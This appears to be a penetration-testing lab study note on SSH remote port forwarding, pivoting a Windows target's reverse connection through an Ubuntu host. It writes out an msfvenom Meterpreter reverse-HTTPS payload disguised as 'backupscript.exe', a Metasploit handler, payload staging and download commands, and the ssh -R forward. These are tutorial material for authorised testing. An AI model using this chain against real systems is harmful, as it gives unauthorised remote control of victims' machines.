# Remote Port Forwarding  
  
> Unlike local/dynamic port forwarding, **remote port forwarding** exposes a local service to a remote port — used when a target cannot route directly back to the attacker.  
  
---  
  
## The Problem  
  
- **Windows A** can only reach `172.16.5.0/23`  
- It has **no direct path** to the attacker's network (`10.129.x.x`)  
- A standard Metasploit reverse listener won't receive the connection  
  
---  
  
## The Solution — Pivot Host  
  
The **Ubuntu server** (`172.16.5.129`) sits between both networks:  
- Reachable by **Windows A**  
- Reachable by the **attack host**  
  
It acts as the bridge — Windows connects to Ubuntu, Ubuntu forwards the traffic back to the attacker.  
  
---  
  
## Traffic Flow

Windows A → Ubuntu :8080 → Attacker :8000

  
- Payload's `LHOST` = Ubuntu IP (`172.16.5.129`)  
- Ubuntu port `8080` forwards to attacker port `8000`  
- Metasploit listener runs on attacker at port `8000`  
  
---  
  
## Steps  
  
1. Generate a **Meterpreter HTTPS payload** with `msfvenom`, setting `LHOST` to `172.16.5.129`  
2. Set up **remote port forwarding** on Ubuntu: port `8080` → attacker port `8000`  
3. Start a **Metasploit listener** on the attack host at port `8000`  
4. Execute payload on Windows A → Meterpreter session established through the pivot  
  
---  
  
## Why Not Just Use RDP?  
  
RDP alone is limited when:  
- Clipboard is disabled (can't upload/download files)  
- You need to run exploits or use low-level Windows API  
- You need enumeration via Meterpreter that built-in Windows tools can't do  
  
#### Creating a Windows Payload with msfvenom  
```bash  
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

#### Configuring & Starting the multi/handler

```
use exploit/multi/handler  
set lhost 0.0.0.0  
set lport 8000  
run
```

- Once payload is created, we move it to our pivot host, The ubuntu machine.
- we can do that with `scp`
#### Transferring Payload to Pivot Host

```
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/ backupscript.exe
```

#### Transferring Payload to the Windows Target

- After copying the payload, we will start a `python3 HTTP server` on the Ubuntu server.
#### Starting Python3 Webserver on Pivot Host

```
python3 -m http.server 8123
```

#### Downloading Payload on the Windows Target

```
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

#### SSH Remote port forwarding

- Once we have our payload in the windows host we can move on to the next step.
- We can use SSH Remote port forwarding to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000.
- `-VN`: makes it verbose and disables login shell prompt
- **-R** : Asks the ubuntu server to listen on `<targetIPaddress>`:8080 and forward...



### Using SSH -R

```
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```
